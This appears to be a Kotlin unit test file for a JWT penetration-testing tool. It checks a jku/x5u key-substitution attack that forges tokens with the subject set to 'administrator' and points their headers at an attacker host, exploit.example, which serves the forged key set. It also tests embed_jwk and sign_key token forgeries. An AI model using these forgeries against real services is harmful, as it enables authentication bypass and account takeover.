package io.bitbytelab.raijin.jwt

import com.nimbusds.jose.jwk.Curve
import com.nimbusds.jose.jwk.ECKey
import com.nimbusds.jose.jwk.JWK
import com.nimbusds.jose.jwk.OctetKeyPair
import com.nimbusds.jose.jwk.RSAKey
import com.nimbusds.jose.util.Base64URL
import io.bitbytelab.raijin.bridge.JwtBridge
import kotlinx.serialization.json.Json
import kotlinx.serialization.json.JsonObject
import kotlinx.serialization.json.buildJsonObject
import kotlinx.serialization.json.jsonArray
import kotlinx.serialization.json.jsonObject
import kotlinx.serialization.json.jsonPrimitive
import kotlinx.serialization.json.put
import java.security.cert.CertificateFactory
import java.security.cert.X509Certificate
import java.security.interfaces.ECPublicKey
import java.security.interfaces.RSAPublicKey
import kotlin.test.Test
import kotlin.test.assertEquals
import kotlin.test.assertNull
import kotlin.test.assertTrue

/**
 * `header_url` with a ring key is the whole `jku` / `x5u` key substitution in one call: the token
 * signed with that key, its header pointing at the URL, and the exact document to serve there.
 */
class JwtHeaderUrlTest {
    // Header {"alg":"HS256","typ":"JWT"}, payload {"sub":"1234567890","name":"John Doe","iat":1516239022}.
    private val token =
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" +
            ".eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ" +
            ".SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
    private val jwksUrl = "https://exploit.example/jwks.json"
    private val chainUrl = "https://exploit.example/chain.pem"

    private fun headerUrl(
        bridge: JwtBridge,
        token: String,
        keyId: String?,
        header: String?,
        url: String?,
        overrides: JsonObject? = null,
    ): JsonObject = bridge.attack(token, "header_url", null, null, null, overrides, null, keyId = keyId, header = header, url = url)

    private fun JsonObject.text(name: String): String = getValue(name).jsonPrimitive.content

    private fun certificate(pem: String): X509Certificate =
        CertificateFactory.getInstance("X.509").generateCertificate(pem.byteInputStream()) as X509Certificate

    @Test
    fun `jku returns the signed token and the JWK set to serve`() {
        val bridge = JwtBridge()
        bridge.keys(action = "generate", kty = "RSA", size = 2048, keyId = "k1")
        val result = headerUrl(bridge, token, "k1", "jku", jwksUrl, buildJsonObject { put("sub", "administrator") })
        assertNull(result["error"], result.toString())

        val signed = result.text("token")
        val header = Jwt.split(signed)!!.header
        assertEquals(listOf("alg", "typ", "kid", "jku"), header.keys.toList())
        assertEquals("RS256", header.text("alg"))
        assertEquals("JWT", header.text("typ"))
        assertEquals("k1", header.text("kid"))
        assertEquals(jwksUrl, header.text("jku"))
        assertEquals(header, result["header"])
        assertEquals("k1", result.text("key_id"))
        assertEquals("administrator", Jwt.decode(signed)!!.payload.text("sub"))
        assertEquals("John Doe", Jwt.decode(signed)!!.payload.text("name"))

        val host = result.getValue("host").jsonObject
        assertEquals(jwksUrl, host.text("url"))
        assertEquals("application/json", host.text("content_type"))
        val jwks = Json.parseToJsonElement(host.text("body")).jsonObject
        assertEquals(jwks, result["jwks"])
        assertEquals(setOf("keys"), jwks.keys)
        val hosted = jwks.getValue("keys").jsonArray.single().jsonObject
        // Exactly the public key: what jwt_keys export gives without include_private, and nothing private.
        assertEquals(bridge.keys(action = "export", keyId = "k1")["jwk"], hosted)
        assertEquals(setOf("kty", "kid", "n", "e"), hosted.keys)
        // A verifier that fetches the document and picks the key by kid accepts the token.
        assertEquals(header.text("kid"), hosted.text("kid"))
        assertTrue(JwtJose.verify(signed, JWK.parse(hosted.toString())))
    }

    @Test
    fun `x5u returns the signed token and the certificate chain to serve`() {
        val bridge = JwtBridge()
        bridge.keys(action = "generate", kty = "RSA", size = 2048, keyId = "k1")
        val result = headerUrl(bridge, token, "k1", "x5u", chainUrl)
        assertNull(result["error"], result.toString())
        assertNull(result["jwks"])

        val signed = result.text("token")
        val header = Jwt.split(signed)!!.header
        assertEquals(listOf("alg", "typ", "kid", "x5u"), header.keys.toList())
        assertEquals(chainUrl, header.text("x5u"))
        assertEquals("k1", header.text("kid"))
        // No overrides: the payload segment is the one that came in.
        assertEquals(token.split('.')[1], signed.split('.')[1])

        val host = result.getValue("host").jsonObject
        assertEquals(chainUrl, host.text("url"))
        assertEquals("application/pem-certificate-chain", host.text("content_type"))
        val pem = host.text("body")
        assertTrue(pem.startsWith("-----BEGIN CERTIFICATE-----\n") && pem.endsWith("-----END CERTIFICATE-----\n"), pem)
        assertEquals(1, Regex("-----BEGIN CERTIFICATE-----").findAll(pem).count())

        val cert = certificate(pem)
        cert.verify(cert.publicKey) // self-signed
        cert.checkValidity()
        assertEquals("CN=k1", cert.subjectX500Principal.name)
        // The certificate carries the ring key, and that key verifies the token.
        val certKey = RSAKey.Builder(cert.publicKey as RSAPublicKey).build()
        val ringKey = bridge.keys(action = "export", keyId = "k1").getValue("jwk").jsonObject
        assertEquals(ringKey.text("n"), certKey.modulus.toString())
        assertTrue(JwtJose.verify(signed, certKey))
    }

    @Test
    fun `x5u certificates are issued for EC and EdDSA keys too`() {
        val bridge = JwtBridge()
        bridge.keys(action = "generate", kty = "EC", crv = "P-384", keyId = "ec")
        bridge.keys(action = "generate", kty = "OKP", crv = "Ed25519", keyId = "ed")

        val ec = headerUrl(bridge, token, "ec", "x5u", chainUrl)
        val ecCert = certificate(ec.getValue("host").jsonObject.text("body"))
        ecCert.verify(ecCert.publicKey)
        assertEquals("SHA384withECDSA", ecCert.sigAlgName)
        assertEquals("ES384", Jwt.split(ec.text("token"))!!.alg)
        assertTrue(JwtJose.verify(ec.text("token"), ECKey.Builder(Curve.P_384, ecCert.publicKey as ECPublicKey).build()))

        val ed = headerUrl(bridge, token, "ed", "x5u", chainUrl)
        val edCert = certificate(ed.getValue("host").jsonObject.text("body"))
        edCert.verify(edCert.publicKey)
        assertEquals("EdDSA", Jwt.split(ed.text("token"))!!.alg)
        // An Ed25519 SubjectPublicKeyInfo ends with the 32 raw key bytes.
        val x = edCert.publicKey.encoded.takeLast(32).toByteArray()
        assertTrue(JwtJose.verify(ed.text("token"), OctetKeyPair.Builder(Curve.Ed25519, Base64URL.encode(x)).build()))
    }

    @Test
    fun `the JWK set of an EdDSA key holds its public half only`() {
        val key = (JwtKeyRing().generate("OKP", null, "Ed25519", null, "ed") as JwtKey.Jose).jwk
        val hosted = JwtJose.headerUrlSigned(token, key, null, jwksUrl, null, null)
        assertEquals("jku", hosted.header)
        assertEquals("application/json", hosted.contentType)
        val jwk = Json.parseToJsonElement(hosted.document).jsonObject.getValue("keys").jsonArray.single().jsonObject
        assertEquals(setOf("kty", "crv", "kid", "x"), jwk.keys)
        assertTrue(JwtJose.verify(hosted.token, JWK.parse(jwk.toString())))
    }

    @Test
    fun `the signed token carries one key reference only`() {
        val crowded = """{"alg":"RS256","typ":"JWT","kid":"orig","jwk":{"kty":"oct","k":"AA"},"x5c":["AAAA"],""" +
            """"x5u":"https://old.example/","x5t":"abc","x5t#S256":"def","custom":1}"""
        val original = "${Jwt.b64UrlEncode(crowded)}.${token.split('.')[1]}.AAAA"
        val bridge = JwtBridge()
        bridge.keys(action = "generate", kty = "EC", crv = "P-256", keyId = "k1")

        val viaJku = Jwt.split(headerUrl(bridge, original, "k1", "jku", jwksUrl).text("token"))!!
        assertEquals(
            """{"alg":"ES256","typ":"JWT","kid":"k1","custom":1,"jku":"https://exploit.example/jwks.json"}""",
            viaJku.headerText
        )
        val viaX5u = Jwt.split(headerUrl(bridge, original, "k1", "x5u", chainUrl).text("token"))!!
        assertEquals(
            """{"alg":"ES256","typ":"JWT","kid":"k1","x5u":"https://exploit.example/chain.pem","custom":1}""",
            viaX5u.headerText
        )

        val embedded = bridge.attack(original, "embed_jwk", null, null, null, null, null, keyId = "k1").text("token")
        val embeddedHeader = Jwt.split(embedded)!!.header
        assertEquals(listOf("alg", "typ", "kid", "jwk", "custom"), embeddedHeader.keys.toList())
        assertEquals(bridge.keys(action = "export", keyId = "k1")["jwk"], embeddedHeader["jwk"])

        // sign_key points at no key by itself, so it leaves the references it was given.
        val plain = bridge.attack(original, "sign_key", null, null, null, null, null, keyId = "k1").text("token")
        assertEquals(
            listOf("alg", "typ", "kid", "jwk", "x5c", "x5u", "x5t", "x5t#S256", "custom"),
            Jwt.split(plain)!!.header.keys.toList()
        )
    }

    @Test
    fun `without a key the header is set and the signature left alone`() {
        val bridge = JwtBridge()
        val result = headerUrl(bridge, token, null, "x5u", chainUrl)
        val probe = result.text("token")
        assertEquals(token.split('.')[1], probe.split('.')[1])
        assertEquals(token.split('.')[2], probe.split('.')[2])
        assertEquals(chainUrl, Jwt.split(probe)!!.header.text("x5u"))
        assertNull(result["host"])
        assertTrue("key_id" in result.text("note"))

        // jku is the default header.
        val byDefault = headerUrl(bridge, token, null, null, jwksUrl).text("token")
        assertEquals(jwksUrl, Jwt.split(byDefault)!!.header.text("jku"))
    }

    @Test
    fun `header_url says what is missing`() {
        val bridge = JwtBridge()
        bridge.keys(action = "generate", kty = "oct", keyId = "secret")
        bridge.keys(action = "generate", kty = "password", keyId = "pw")
        bridge.keys(action = "generate", kty = "EC", crv = "P-256", keyId = "ec")
        fun error(result: JsonObject): String = result.text("error")

        assertTrue("requires url" in error(headerUrl(bridge, token, "ec", "jku", null)))
        assertTrue("requires url" in error(headerUrl(bridge, token, "ec", "jku", "  ")))
        assertTrue("jku or x5u" in error(headerUrl(bridge, token, "ec", "kid", jwksUrl)))
        assertTrue("asymmetric" in error(headerUrl(bridge, token, "secret", "jku", jwksUrl)))
        assertTrue("password" in error(headerUrl(bridge, token, "pw", "jku", jwksUrl)))
        assertTrue("Unknown key_id" in error(headerUrl(bridge, token, "nope", "jku", jwksUrl)))
        assertTrue("Not a decodable" in error(headerUrl(bridge, "garbage", "ec", "jku", jwksUrl)))

        val publicOnly = JwtBridge()
        publicOnly.keys(action = "import", jwk = bridge.keys(action = "export", keyId = "ec").getValue("jwk").toString())
        assertTrue("public only" in error(headerUrl(publicOnly, token, "ec", "x5u", chainUrl)))
    }
}
